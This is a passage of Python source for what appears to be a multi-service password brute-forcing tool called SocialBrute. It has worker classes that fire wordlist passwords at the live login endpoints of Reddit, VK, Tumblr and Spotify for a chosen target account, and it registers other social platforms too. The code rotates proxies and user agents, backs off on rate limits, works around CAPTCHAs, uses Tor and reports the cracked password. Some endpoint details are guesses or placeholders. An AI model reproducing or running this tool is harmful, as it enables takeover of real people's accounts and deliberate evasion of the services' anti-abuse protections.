                if modhash:
                    data["uh"] = modhash # Reddit often uses 'uh' for modhash/csrf in form data

                # Re-fetch modhash if session changes or becomes invalid (e.g., after proxy switch)
                if not modhash: # Simple check, can be more robust
                    safe_print("[RD] Re-fetching CSRF token/modhash...")
                    r_csrf_refresh = local_session.get(login_url, timeout=20)
                    match = re.search(r'name="csrf_token" value="([^"]+)"', r_csrf_refresh.text)
                    if not match:
                        match = re.search(r'"modhash": "(.*?)"', r_csrf_refresh.text)
                    if match:
                        modhash = match.group(1)
                        data["uh"] = modhash
                    else:
                        safe_print("[RD] Warning: Could not re-fetch CSRF token/modhash.")
                        self.queue.put((pwd, attempts + 1))
                        self._update_task(pwd, attempts + 1)
                        local_session = self.get_session_with_proxy()
                        self.queue.task_done()
                        continue

                r = local_session.post(login_url, data=data, allow_redirects=False, timeout=20)
                
                if r.status_code == 429:
                    safe_print(f"[RD] Rate limit detected (429), switching proxy and backing off.")
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue

                if detect_captcha(r):
                    solve_captcha()
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                tried += 1
                progress_bar(tried, total)

                json_resp = r.json()
                # Reddit's JSON response for login errors usually contains "errors" key
                if not json_resp.get("json", {}).get("errors"):
                    # Success indicated by no errors, or a specific redirect/cookie
                    self.success_pwd = pwd
                    stop_event.set()
                    self.queue.task_done()
                    safe_print(f"\n[RD] Authentication successful for {self.target} with password: {pwd}")
                    break
                else:
                    error_message = json_resp.get("json", {}).get("errors", [["UNKNOWN", "Unknown error"]])[0][1]
                    safe_print(f"\n[RD] Failed attempt for {self.target} with password: {pwd}. Error: {error_message}")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                
                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[RD] Network/Request Exception: {e}. Re-queuing and changing proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy()
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except json.JSONDecodeError:
                safe_print(f"[RD] JSON Decode Error - unexpected response format for {self.target}. Re-queuing.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except Exception as e:
                safe_print(f"[RD] Unexpected Exception: {e}. Re-queuing.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()

class VKBrute(BaseBruteForce):
    def worker(self):
        login_url = "https://m.vk.com/login"
        total = self.queue.qsize()
        tried = 0
        local_session = self.get_session_with_proxy()

        safe_print("[VK] Warning: VK brute forcing can be challenging due to rate limits and anti-bot measures.")

        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[VK] Delaying {current_delay:.2f}s before retry for '{pwd}' ({attempts} failed attempts).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({"User-Agent": random_user_agent()})
                
                # VK often requires a 'ip_h' and 'lg_h' parameter from the login page source.
                # It's best to fetch these dynamically.
                r_init = local_session.get(login_url, timeout=20)
                ip_h_match = re.search(r'name="ip_h" value="([^"]+)"', r_init.text)
                lg_h_match = re.search(r'name="lg_h" value="([^"]+)"', r_init.text)
                
                ip_h = ip_h_match.group(1) if ip_h_match else ""
                lg_h = lg_h_match.group(1) if lg_h_match else ""

                if not ip_h or not lg_h:
                    safe_print("[VK] Warning: ip_h or lg_h tokens not found. VK brute force may fail.")
                    # Re-queue with higher attempts and try a new session/proxy
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    local_session = self.get_session_with_proxy()
                    self.queue.task_done()
                    continue

                data = {
                    "email": self.target,
                    "pass": pwd,
                    "ip_h": ip_h,
                    "lg_h": lg_h,
                    "role": "button",
                    "to": ""
                }
                
                r = local_session.post(login_url, data=data, allow_redirects=False, timeout=20)
                
                if r.status_code == 429:
                    safe_print(f"[VK] Rate limit detected (429), switching proxy and backing off.")
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue

                if detect_captcha(r):
                    solve_captcha()
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                tried += 1
                progress_bar(tried, total)

                # VK success usually redirects to profile/feed or sets specific cookies.
                # Incorrect password often has a specific error message.
                if "remixlhk" in r.cookies or "remixsid" in r.cookies or "feed" in r.headers.get("Location", ""):
                    self.success_pwd = pwd
                    stop_event.set()
                    self.queue.task_done()
                    safe_print(f"\n[VK] Authentication successful for {self.target} with password: {pwd}")
                    break
                elif "incorrect password" in r.text.lower() or "wrong password" in r.text.lower() or "error" in r.text.lower():
                    safe_print(f"\n[VK] Failed attempt for {self.target} with password: {pwd} (Incorrect/Error).")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                else:
                    safe_print(f"\n[VK] Unhandled response for {self.target} with password: {pwd}. Status: {r.status_code}, Response: {r.text[:200]}...")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                
                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[VK] Network/Request Exception: {e}. Re-queuing and changing proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy()
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except Exception as e:
                safe_print(f"[VK] Unexpected Exception: {e}. Re-queuing.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()


class TumblrBrute(BaseBruteForce):
    def worker(self):
        login_url = "https://www.tumblr.com/login"
        auth_url = "https://www.tumblr.com/svc/auth/signin" # This is likely an API endpoint
        total = self.queue.qsize()
        tried = 0
        local_session = self.get_session_with_proxy()

        safe_print("[TB] Warning: Tumblr uses robust anti-bot measures and complex JS-driven login. Direct requests are very difficult.")
        
        # Tumblr often requires a CSRF token and possibly other dynamic parameters.
        # This will require scraping the login page.
        form_key = None
        try:
            r_init = local_session.get(login_url, timeout=20)
            # Example: Looking for a hidden input field named 'form_key'
            match = re.search(r'name="form_key" value="([^"]+)"', r_init.text)
            if match:
                form_key = match.group(1)
                safe_print(f"[TB] Found form_key: {form_key}")
            else:
                safe_print("[TB] Warning: form_key not found. Tumblr brute force may fail.")
        except Exception as e:
            safe_print(f"[TB] Error fetching initial Tumblr login page/form_key: {e}. Worker stopping.")
            self.queue.put((self.target, self.max_attempts))
            return

        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[TB] Delaying {current_delay:.2f}s before retry for '{pwd}' ({attempts} failed attempts).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({
                    "User-Agent": random_user_agent(),
                    "Referer": login_url,
                    "Content-Type": "application/json" # Tumblr might use JSON for API login
                })
                
                # Tumblr's login might be a two-step process (email then password).
                # This example assumes a single API call for simplicity, but real Tumblr is harder.
                data = {
                    "email": self.target,
                    "password": pwd
                }
                if form_key:
                    data["form_key"] = form_key # Include form_key if needed in JSON or form-encoded

                r = local_session.post(auth_url, json=data, allow_redirects=False, timeout=20) # Use json=data for JSON payload
                
                if r.status_code == 429:
                    safe_print(f"[TB] Rate limit detected (429), switching proxy and backing off.")
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue

                if detect_captcha(r):
                    solve_captcha()
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                tried += 1
                progress_bar(tried, total)

                json_resp = {}
                try:
                    json_resp = r.json()
                except json.JSONDecodeError:
                    safe_print(f"\n[TB] JSON Decode Error - unexpected response format for {self.target}.")

                if json_resp.get("meta", {}).get("status") == 200 and json_resp.get("response", {}).get("authenticated"):
                    self.success_pwd = pwd
                    stop_event.set()
                    self.queue.task_done()
                    safe_print(f"\n[TB] Authentication successful for {self.target} with password: {pwd}")
                    break
                elif json_resp.get("meta", {}).get("msg") == "Invalid Credentials" or "error" in r.text.lower():
                    safe_print(f"\n[TB] Failed attempt for {self.target} with password: {pwd} (Invalid Credentials/Error).")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                else:
                    safe_print(f"\n[TB] Unhandled response for {self.target} with password: {pwd}. Status: {r.status_code}, JSON: {json_resp}")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                
                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[TB] Network/Request Exception: {e}. Re-queuing and changing proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy()
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except Exception as e:
                safe_print(f"[TB] Unexpected Exception: {e}. Re-queuing.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()

class SpotifyBrute(BaseBruteForce):
    def worker(self):
        login_url = "https://accounts.spotify.com/api/login"
        total = self.queue.qsize()
        tried = 0
        local_session = self.get_session_with_proxy()

        safe_print("[SP] Warning: Spotify has strong security measures against automated logins, including CAPTCHAs and rate limiting.")

        while not stop_event.is_set() and not self.queue.empty():
            pwd, attempts = self.queue.get()
            if attempts >= self.max_attempts:
                self.queue.task_done()
                self._remove_task(pwd)
                continue
            
            current_delay = self.initial_backoff * (2 ** attempts)
            current_delay = min(current_delay, MAX_BACKOFF)
            if attempts > 0:
                safe_print(f"[SP] Delaying {current_delay:.2f}s before retry for '{pwd}' ({attempts} failed attempts).")
                time.sleep(current_delay)

            try:
                local_session.headers.update({
                    "User-Agent": random_user_agent(),
                    "Referer": "https://accounts.spotify.com/en/login",
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                })

                data = {
                    "username": self.target,
                    "password": pwd,
                    "remember_me": False,
                    "csrf_token": "a_dummy_csrf_token" # Spotify requires a CSRF token, needs to be fetched dynamically
                }

                # In a real scenario, you'd make a GET request to the login page first
                # to extract a valid CSRF token and potentially other flow_ids.
                # Example (not fully implemented here):
                # r_init_csrf = local_session.get("https://accounts.spotify.com/en/login", timeout=10)
                # csrf_token_match = re.search(r'"csrfToken":"(.*?)"', r_init_csrf.text)
                # if csrf_token_match:
                #    data["csrf_token"] = csrf_token_match.group(1)
                # else:
                #    safe_print("[SP] Warning: Spotify CSRF token not found. Login likely to fail.")
                #    self.queue.put((pwd, attempts + 1))
                #    self._update_task(pwd, attempts + 1)
                #    local_session = self.get_session_with_proxy()
                #    self.queue.task_done()
                #    continue

                r = local_session.post(login_url, json=data, allow_redirects=False, timeout=20)
                
                if r.status_code == 429:
                    safe_print(f"[SP] Rate limit detected (429), switching proxy and backing off.")
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    time.sleep(random.uniform(current_delay, current_delay * 1.5))
                    continue

                if detect_captcha(r):
                    solve_captcha()
                    local_session = self.get_session_with_proxy()
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                    self.queue.task_done()
                    continue

                tried += 1
                progress_bar(tried, total)

                json_resp = {}
                try:
                    json_resp = r.json()
                except json.JSONDecodeError:
                    safe_print(f"\n[SP] JSON Decode Error - unexpected response format for {self.target}.")

                if json_resp.get("status") == "OK" and json_resp.get("authenticated"):
                    self.success_pwd = pwd
                    stop_event.set()
                    self.queue.task_done()
                    safe_print(f"\n[SP] Authentication successful for {self.target} with password: {pwd}")
                    break
                elif json_resp.get("error") and "incorrect_username_or_password" in json_resp["error"]:
                    safe_print(f"\n[SP] Failed attempt for {self.target} with password: {pwd} (Incorrect Username/Password).")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                else:
                    safe_print(f"\n[SP] Unhandled response for {self.target} with password: {pwd}. Status: {r.status_code}, JSON: {json_resp}")
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                
                time.sleep(random.uniform(1.0, 3.0))

            except requests.exceptions.RequestException as e:
                safe_print(f"[SP] Network/Request Exception: {e}. Re-queuing and changing proxy.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                local_session = self.get_session_with_proxy()
                time.sleep(random.uniform(current_delay, current_delay * 2))
            except Exception as e:
                safe_print(f"[SP] Unexpected Exception: {e}. Re-queuing.")
                if attempts < self.max_attempts:
                    self.queue.put((pwd, attempts + 1))
                    self._update_task(pwd, attempts + 1)
                time.sleep(random.uniform(current_delay, current_delay * 2))
            finally:
                self.queue.task_done()


SERVICES = {
    "facebook": FacebookBrute,
    "instagram": InstagramBrute,
    "twitter": TwitterBrute, # Keep with disclaimer
    "linkedin": LinkedInBrute,
    "tiktok": TikTokBrute,
    "snapchat": SnapchatBrute,
    "pinterest": PinterestBrute,
    "reddit": RedditBrute,     # NEW
    "vk": VKBrute,             # NEW
    "tumblr": TumblrBrute,     # NEW
    "spotify": SpotifyBrute,   # NEW
}

def load_wordlist():
    safe_print("Enter wordlist path or press Enter for default (rockyou.txt):")
    path = input(">> ").strip()
    if not path:
        path = ROCKYOU_PATH
    if not os.path.isfile(path):
        safe_print("[!] Wordlist not found. Please provide a valid path or ensure rockyou.txt downloaded.")
        return []
    # Increased limit to read more passwords for "highest rate of success"
    return load_passwords(path, 1000000) # Load up to 1 million passwords

def main_menu():
    ensure_dirs()
    download_wordlist()
    initialize_proxy_pool() # Initialize proxy pool at start
    
    safe_print("\n=== SocialBrute Advanced Multi-Service Brute Forcer ===")
    safe_print("Supported services (Working implementations have disclaimers):")
    for s, cls in SERVICES.items():
        if s in ["facebook", "instagram", "linkedin"]: # These have more realistic attempts
            safe_print(f" - {s} (More realistic implementation, still challenging)")
        elif s in ["twitter", "reddit", "vk", "tumblr", "spotify"]: # These are added with disclaimers
            safe_print(f" - {s} (Highly protected/API outdated, may not work reliably without headless browser)")
        else:
            safe_print(f" - {s} (Highly protected, not reliably implemented with direct requests)")

    while True:
        safe_print("\nEnter service name (or 'exit' to quit):")
        service = input(">> ").lower().strip()
        if service == "exit":
            safe_print("Exiting...")
            stop_event.set()
            break
        if service not in SERVICES:
            safe_print("[!] Unsupported service.")
            continue
        
        safe_print(f"Enter target username/email/phone for {service}:")
        target = input(">> ").strip()
        if not target:
            safe_print("[!] Target cannot be empty.")
            continue
        
        passwords = load_wordlist()
        if not passwords:
            safe_print("[!] No passwords loaded, aborting.")
            continue
        
        safe_print(f"Starting brute force on {service} for target '{target}' with {len(passwords)} passwords...")
        brute = SERVICES[service](target, passwords, service)
        brute.start()
        safe_print("[*] Task complete.\n")

if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        safe_print("\n[*] Interrupted by user. Exiting.")
    finally:
        stop_tor() # Ensure Tor is stopped on exit (if it was started)